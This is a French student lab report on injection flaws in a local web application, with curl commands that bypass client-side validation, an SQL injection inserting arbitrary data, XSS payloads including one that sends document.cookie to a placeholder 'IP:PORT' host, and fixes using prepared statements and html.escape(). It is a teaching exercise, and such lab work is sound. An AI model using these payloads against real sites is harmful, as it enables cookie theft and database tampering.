# Rendu "Injection"

## Binôme

**Nom :** Bouhjira  
**Prénom :** Ali  
**Email :** ali.bouhjira.etu@univ-lille.fr

## Question 1

### Quel est ce mécanisme ?

Une expression régulière (regex) est utilisée dans une fonction `validate` afin de vérifier que la chaîne saisie ne contient que des lettres. Cette validation est effectuée lors d'un événement côté client.

### Est-il efficace ? Pourquoi ?

Non, ce mécanisme n'est pas totalement efficace. La validation est réalisée uniquement lors de l'événement `onsubmit`, côté client. La chaîne n'est donc pas vérifiée une fois reçue par le serveur. Si l'on trouve un moyen d'envoyer directement une requête au serveur, la chaîne sera acceptée même si elle contient des caractères spéciaux.

## Question 2

### Votre commande curl

```bash
curl 'http://localhost:8080/' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost:8080' -H 'Connection: keep-alive' -H 'Referer: http://localhost:8080/' -H 'Cookie: ExempleCookie="Valeur du cookie"' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'chaine=//--&submit=OK'
```

## Question 3

### Votre commande curl permettant d'ajouter une entrée avec un contenu arbitraire dans le champ `who`

```bash
curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie=\"Valeur du cookie\"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=y' , 'contenu arbitraire') -- &submit=OK"
```

### Expliquez comment obtenir des informations sur une autre table

Si nous connaissons le nom d'une autre table, il est potentiellement possible d'exploiter l'injection SQL afin de modifier la requête exécutée par le serveur. Cela pourrait permettre d'accéder à des informations provenant d'autres tables de la base de données.

## Question 4

### Correction de la faille de sécurité

Une manière de corriger cette faille consiste à ne plus construire les requêtes SQL par concaténation de chaînes de caractères. Il est préférable d'utiliser les requêtes préparées fournies par la bibliothèque `mysql.connector`. Cette méthode permet de séparer les données de la requête SQL et empêche ainsi qu'une entrée utilisateur soit interprétée comme du code SQL.

## Question 5

### Commande curl pour afficher une fenêtre de dialogue

```bash
curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie=\"Valeur du cookie\"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=<script>alert()</script>&submit=OK"
```

### Commande curl pour lire les cookies

```bash
curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie=\"Valeur du cookie\"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=<script>document.location='http://IP:PORT'+document.cookie;</script>&submit=OK"
```

## Question 6

### Correction de la faille XSS

L'utilisation de la fonction `html.escape()` permet de convertir les caractères spéciaux tels que `<` et `>` en entités HTML sûres. Ainsi, le navigateur les affiche comme du texte et n'exécute pas le contenu comme un script.

La mesure la plus importante consiste à échapper les données avant leur affichage. Il est également possible de les échapper avant leur insertion dans la base de données afin d'ajouter une protection supplémentaire, mais cela peut modifier les données stockées et n'est généralement pas recommandé.
